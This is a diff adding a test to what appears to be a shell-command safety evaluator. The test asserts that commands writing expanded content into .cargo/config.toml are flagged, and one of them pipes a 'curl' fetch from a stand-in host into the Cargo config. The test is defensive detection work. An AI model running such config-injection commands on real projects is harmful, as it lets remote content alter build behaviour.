@@ -217,3 +217,12 @@ def test_r3_false_positives_closed():
                 "tar czf b.tgz .cargo/config.toml", "git restore --staged .cargo/config.toml",
                 "cd .cargo && cp config.toml /tmp/b", "git checkout main; cat .cargo/config.toml"]:
         assert not _hit(evaluate(_shell(cmd), EMPTY)), cmd
+
+
+def test_r4_echo_with_expansion_gated():
+    for cmd in ["echo $(cat /tmp/e) > .cargo/config.toml",
+                'echo "$(curl -s http://e)" > .cargo/config.toml',
+                "echo `cat /tmp/e` > .cargo/config.toml",
+                'echo "$PAYLOAD" >> ~/.cargo/config.toml',
+                "printf '%s' \"$P\" > .cargo/config.toml"]:
+        assert _hit(evaluate(_shell(cmd), EMPTY)), cmd
